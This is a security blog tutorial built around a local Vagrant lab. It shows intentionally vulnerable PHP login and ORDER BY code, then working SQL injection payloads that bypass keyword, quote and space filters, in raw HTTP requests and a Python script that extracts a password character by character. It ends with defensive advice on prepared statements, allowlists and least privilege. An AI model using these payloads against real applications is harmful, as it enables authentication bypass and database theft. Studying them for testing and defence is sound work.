---
slug: sqli-manual-bypass/
title: Manual SQLi Bypass
date: 2020-05-20
category: attacks
subtitle: Bypassing SQLi filters manually
tags: security, web, vulnerability, ethical-hacking
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620331101/blog/sqli-manual-bypass/cover_mbogji.webp
alt: Photo by Kuma Kum on Unsplash
description: SQL injection can be one of the most dangerous vulnerabilities.
  Here we will see how to bypass certain controls that developers put
  in their code.
keywords: Web, Security, Vulnerability, Hacking, SQLi, Input Validation,
  Ethical Hacking, Pentesting
author: Jonathan Armas
writer: johna
name: Jonathan Armas
about1: Systems Engineer, OSCP - Security+
about2: '"Be formless, shapeless like water" Bruce Lee'
source: https://unsplash.com/photos/oBLk_2Iyisg
---

Among the most recurring vulnerabilities are injection flaws, not for
nothing they are first in the [OWASP Top Ten
list](https://owasp.org/www-project-top-ten/). This type of
vulnerability can disrupt your entire security and infrastructure;
almost any input can be an injection vector and all must be controlled.
Here, `SQL injection` plays a big role, not only because of the risk of
information leakage but also because it can lead to remote command
execution or access to the internal network.

This vulnerability works when an attacker injects code into the queries
that the application makes to the database interfering with its normal
operation. This happens because the developers did not validate data
input properly and did not apply the best practices to retrieve data
from the database. Let me give you an example; imagine this piece of
code:

**Common sqli vulnerable code.**

``` PHP
$user = $_POST['user'];
$passwd = $_POST['passwd'];
$sql = "select id from users where user='$user' and passwd='$passwd'";
```

Here I created a common login page code that checks the username and
password. The variables are introduced through a `POST` request, and
there is no input validation. An attacker could simply put the well
known `SQLi` payload `1' or '1'='1` and bypass the login form. But if I
filter some characters like the `OR keyword` or the `single quote`
character, then will it be ok? Not so much.

## SQLi Bypass lab

To set up our lab, we are going to use `Hashicorp’s`
[Vagrant](https://www.vagrantup.com/); the source files are below.
Create a folder with the name `sqli` and save the `Vagrantfile` there.

**setting up the lab.**

``` bash
$ mkdir sqli
$ cd sqli
sqli$ nano Vagrantfile #Add the content here
```

**Vagrantfile.**

``` ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|

  config.vm.box = "jarmasatfluid/sqlitest"
  config.vm.box_version = "1"
  config.vm.network "private_network", ip: "192.168.56.2"

end
```

Then run the environment using

**vagrant up.**

``` bash
sqli$ vagrant up
```

This will create a `Linux` machine with `LAMP` installed and configured.
At this point, everything we need has been completed and is ready to
launch an attack.

Now we can set up our attacking machine. Here we are using [Kali
Linux](https://www.kali.org/) with `Vagrant` too, but you can use
whatever `OS` you prefer.

These are the tools that we are going to use:

- [Burpsuite](https://portswigger.net/burp)

- [Netcat](http://netcat.sourceforge.net/)

- [Dirbuster](https://tools.kali.org/web-applications/dirbuster)

- [Python](https://www.python.org/)

If you are using `Kali`, then everything has already been installed by
default.

We are ready to go.

## Enumerating our server

First, we need to check the server ports. We can use `nmap` or `ncat` to
do it.

**port scanning.**

``` bash
nmap 192.168.56.2
ncat -vz 192.168.56.2 80
```

**nmap output.**

``` bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 13:32 SA Pacific Standard Time
Nmap scan report for 192.168.56.2
Host is up (0.00051s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
MAC Address: 08:00:27:0A:C5:08 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds
```

**nc.**

``` bash
Ncat: Connected to 192.168.56.2:80.
Ncat: 0 bytes sent, 0 bytes received in 0.31 seconds.
```

Our server runs `Apache` on `port 80`. Then using `Dirbuster`, we can
search for directories on the web server.

**dirbuster.**

``` bash
$ dirb http://192.168.56.2/

DIRB v2.22
By The Dark Raver

START_TIME: Mon May 20 11:26:17 2020
URL_BASE: http://192.168.56.2/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

GENERATED WORDS: 4612

 Scanning URL: http://192.168.56.2/
==> DIRECTORY: http://192.168.56.2/code/
+ http://192.168.56.2/index.html (CODE:200|SIZE:11321)
+ http://192.168.56.2/server-status (CODE:403|SIZE:277)

 Entering directory: http://192.168.56.2/code/
+ http://192.168.56.2/code/admin.php (CODE:302|SIZE:2075)
+ http://192.168.56.2/code/index.php (CODE:200|SIZE:1098)

END_TIME: Mon May 20 11:26:25 2020
DOWNLOADED: 9224 - FOUND: 4
```

As we can see, there is an admin site to which we do not have access and
a normal site where our test cases are.

## SQLi bypass attacks

There are three test cases; the first one is the simplest. It filters
the `OR|AND` keywords and also the space character.

**First SQLi filter.**

``` PHP
if(preg_match('/or|and| /i',$pass)) exit("<script type='text/javascript'>alert('Wrong');</script>");
```

The username is not injectable because it uses a prepared statement
(this was intended to show the correct way of doing queries). If we put
any of those characters into the query, it should respond with a `Wrong`
alert.

To bypass this, we need to substitute those keywords: the `OR` keyword
with the double pipe character `||`, and the `AND` keyword with the
double ampersand character `&&`. In this case, we need to `URL encode`
it because of the content type of the web application resulting in
`%26%26`. Finally, the space character can be bypassed using several
substitutions, such as the following:

1. The block comment `/**/`

2. The ascii `%09` horizontal tab character

3. The ascii `%0a` new line character

4. The ascii `%0b` vertical tab character

5. The ascii `%0c` new page character

6. The ascii `%0d` carriage return character

So, our well known SQLi payload will change to something like
`'/**/||/**/1=1#`

**first bypass.**

``` text
    POST /code/one.php HTTP/1.1
    Host: 192.168.56.2
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 44
    Origin: http://192.168.56.2
    Connection: close
    Referer: http://192.168.56.2/code/one.php
    Upgrade-Insecure-Requests: 1

    user=admin&password='/**/||/**/1%3d1%23&s=OK
```

The next test case is a little trickier, it filters the same characters
as before plus the single quote character. Also, it removes the use of
the prepared statement in the username variable but validates the single
quote character too.

**Second SQLi filter.**

``` PHP
if(preg_match('/\'/', $user)) exit("<script type='text/javascript'>alert('Wrong');</script>");
if(preg_match('/or|and| |\'/i',$pass)) exit("<script type='text/javascript'>alert('Wrong');</script>");
$sql = "SELECT * FROM users WHERE user = '$user' and passwd = '$pass'";
```

So, what can we do to bypass this? The backslash character `\` is a
special escape character used to indicate other special characters in
strings. This is useful in our case because if we inject that character
into the username input, then the single quote character next to it will
act as a literal one, and the username string will end next to the
password input:

**Backslash example.**

``` PHP
$sql = "SELECT * FROM users WHERE user = '$user\' and passwd = '$pass'";
```

It’s just a matter of injecting our code there; the payload in the
username will be `\`, and in the password field it will be
`/**/||/**/1=1/**/--`

**second bypass.**

``` text
    GET /code/two.php?user=%5C&password=%2F**%2F%7C%7C%2F**%2F1%3D1%2F**%2F--&s=OK HTTP/1.1
    Host: 192.168.56.2
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Connection: close
    Referer: http://192.168.56.2/code/two.php
    Upgrade-Insecure-Requests: 1
```

The last example combines everything and adds more filters to the code;
it is a different type of vulnerability because we are going to bypass
the filter into an `ORDER BY` keyword.

**Third SQLi filter.**

``` PHP
if(preg_match('/\'|"|=|admin|substr|concat|group|ascii|or|and| |-|#|\s|\/\\\\|like|0x|col|case|when|sleep|benchmark/i',$_GET["by"])) exit("<script type='text/javascript'>alert('Wrong');</script>");
...
$stmt = $link->prepare("SELECT * FROM product where name like ? order by $order desc");
```

Here we can hardly use any keywords or functions, and the `union select`
won’t work either. To collect data from the database from an `ORDER BY`
keyword, we need to use an error-based `SQLi` or a time-based one.

So, the first injection will be for testing the vulnerability, let’s
inject a simple error-based `SQLi` where, if it is true, then it will
order the items using the id, and if it is false, it will order them
using the name:

1. `?by=if(false,id,name)`

2. `?by=if(true,id,name)`

Now, let’s add another layer. We want to get information out of this and
in order to do that we need to make some queries. In this example, we
will get the `guest` password (if you want to get the admin password,
you should try it yourself). Because the characters `=`, single and
double quotes are filtered, we need another way to get the information
of the user that we want. Here we have the `IN` operator and the `CHAR`
function. The `IN` operator allows us to specify multiple values in a
`WHERE` clause but we can use only one if we want it, and the `CHAR`
function returns the `ASCII` character based on a number. Using both
elements, a query for the guest password will be something like this:

**guest password query.**

``` text
    select passwd from users where user in(CHAR(103,117,101,115,116))
```

Here the string `guest` is the combination of `103,117,101,115,116`
`ASCII` characters. Now the `MID` function will help us to strip
characters from that query and get the password character by character.
This query will get the first character of the password:

**guest password character.**

``` text
    mid((select passwd from users where user in(CHAR(103,117,101,115,116))),1,1)
```

Next, we need to compare it against another character; here we are going
to use `IN` and `CHAR` again:

**guest password comparison.**

``` text
    mid((select passwd from users where user in(CHAR(103,117,101,115,116))),1,1) in(CHAR(49))
```

Finally, we put our query into the previous `IF` function and replace
the spaces with the block comment:

**guest password comparison.**

``` text
    ?by=if(mid((select/**/passwd/**/from/**/users/**/where/**/user/**/in(CHAR(103,117,101,115,116))),1,1)/**/in(CHAR(49)),id,name)
```

With this, we can get the `guest` password using the `ORDER BY`
function. Doing this manually would take quite a while, let’s automatize
it using `Python`. The first thing that we need is a function that makes
our queries and returns the response:

**make request function.**

``` Python
def make_request(parms):
    """
    Makes the request
    """
    response = requests.get(URL, headers=HEADERS, params=parms,
                            cookies=COOKIES)
    return response.text
```

Then we need to iterate through each element of the password and each
`ASCII` character:

**iterative query.**

``` Python
# Length of the password
for i in range(8):
  # All ASCII table
  for j in range(0, 128):
    query = 'if(mid((select/**/passwd/**/from/**/users/**/where/**/user/**/in(CHAR(103,117,101,115,116))),'+str(i)+',1)/**/in(CHAR('+str(j)+')),id,name)'
```

And finally, we check whether the list is ordered by id:

**iterative query.**

``` Python
check = ">Description</th></tr></thead><tbody><tr><td>5"
if check in resp:
  PASSWORD += chr(j)
  break
```

That’s it, create the exploit, execute it, and wait for the result. This
could be done using any other query, for example, getting the `MySQL`
user password hash.

## Solution

The first thing that someone with this problem needs to do is to
implement prepared statements; there is no way out of it. Injections can
occur at almost any (if not all) database provider. With these
statements, the software will present a robust data querying and discard
the use of dynamic queries.

The next step is to execute whitelists to validate user input. When the
developers use blacklist filtering, as in the examples above, there is a
risk of missing some parameter that can allow the injection. Whitelists
are a better approach because they only allow what is in them and
nothing else.

Finally, there is the implementation of the principle of least
privilege. I’ve encountered several databases executing queries using
the root user; it is better to use limited users in our applications
because it limits the range of action of the attackers that, in the
worst scenario, get access to the database.

If you want more information about protections against `SQLi`, you can
check
[OWASP](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)
or our [**Criteria**](https://docs.fluidattacks.com/criteria/).
